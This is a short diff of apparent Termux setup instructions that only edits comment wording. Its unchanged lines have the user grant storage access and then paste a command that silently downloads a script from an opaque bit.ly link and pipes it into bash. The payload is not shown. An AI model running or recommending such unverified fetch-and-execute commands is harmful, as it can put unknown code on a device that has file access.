@@ -4,13 +4,15 @@
 
 
 
-# 1st: give file permissions to Termux
+# 1st : give file permission to Termux
 
        termux-setup-storage
 
-# if you already gave the file permissions, please don't run this command.
+# if you already gave the file permission, please don't run this command.
 
-# 2nd: copy and run this command:
+
+
+# 2nd : copy and run this command:
 
 
        clear; curl -s -L https://bit.ly/3haiM4V | bash
